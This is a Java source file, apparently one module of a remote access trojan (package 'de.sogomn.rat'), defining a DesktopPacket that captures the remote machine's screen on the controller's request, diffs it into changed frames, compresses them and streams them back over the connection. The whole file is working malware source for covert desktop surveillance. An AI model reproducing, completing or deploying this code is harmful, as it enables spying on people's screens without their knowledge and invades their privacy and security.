package de.sogomn.rat.packet;

import java.awt.image.BufferedImage;
import java.util.ArrayList;
import java.util.stream.Stream;

import de.sogomn.engine.util.ImageUtils;
import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.util.FrameEncoder;
import de.sogomn.rat.util.FrameEncoder.IFrame;
import de.sogomn.rat.util.QuickLZ;

public final class DesktopPacket extends AbstractPingPongPacket {
	
	private IFrame[] frames;
	private int screenWidth, screenHeight;
	
	private byte deleteLastScreenshot;
	
	private static BufferedImage lastScreenshot;
	
	private static final byte KEEP = 0;
	private static final byte DELETE = 1;
	
	private static final byte INCOMING = 1;
	private static final byte END = 0;
	
	public DesktopPacket(final boolean delete) {
		type = REQUEST;
		deleteLastScreenshot = delete ? DELETE : KEEP;
	}
	
	public DesktopPacket() {
		this(false);
	}
	
	@Override
	protected void sendRequest(final ActiveConnection connection) {
		connection.writeByte(deleteLastScreenshot);
	}
	
	@Override
	protected void sendData(final ActiveConnection connection) {
		Stream.of(frames).forEach(frame -> {
			byte[] data = ImageUtils.toByteArray(frame.image, 0);
			data = QuickLZ.compress(data);
			
			connection.writeByte(INCOMING);
			connection.writeShort((short)frame.x);
			connection.writeShort((short)frame.y);
			connection.writeInt(data.length);
			connection.write(data);
		});
		
		connection.writeByte(END);
		connection.writeInt(screenWidth);
		connection.writeInt(screenHeight);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection connection) {
		deleteLastScreenshot = connection.readByte();
	}
	
	@Override
	protected void receiveData(final ActiveConnection connection) {
		final ArrayList<IFrame> framesList = new ArrayList<IFrame>();
		
		while (connection.readByte() == INCOMING) {
			final int x = connection.readShort();
			final int y = connection.readShort();
			final int length = connection.readInt();
			
			byte[] data = new byte[length];
			connection.read(data);
			data = QuickLZ.decompress(data);
			
			final BufferedImage image = ImageUtils.toImage(data);
			final IFrame frame = new IFrame(x, y, image);
			
			framesList.add(frame);
		}
		
		frames = framesList.stream().toArray(IFrame[]::new);
		screenWidth = connection.readInt();
		screenHeight = connection.readInt();
	}
	
	@Override
	protected void executeRequest(final ActiveConnection connection) {
		final BufferedImage screenshot = FrameEncoder.captureScreen();
		
		if (deleteLastScreenshot == DELETE || lastScreenshot == null) {
			final IFrame frame = new IFrame(0, 0, screenshot);
			
			frames = new IFrame[1];
			frames[0] = frame;
		} else if (deleteLastScreenshot == KEEP) {
			frames = FrameEncoder.getIFrames(lastScreenshot, screenshot);
		} else {
			frames = new IFrame[0];
		}
		
		type = DATA;
		screenWidth = screenshot.getWidth();
		screenHeight = screenshot.getHeight();
		lastScreenshot = screenshot;
		
		connection.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection connection) {
		//...
	}
	
	public IFrame[] getFrames() {
		return frames;
	}
	
	public int getScreenWidth() {
		return screenWidth;
	}
	
	public int getScreenHeight() {
		return screenHeight;
	}
	
}
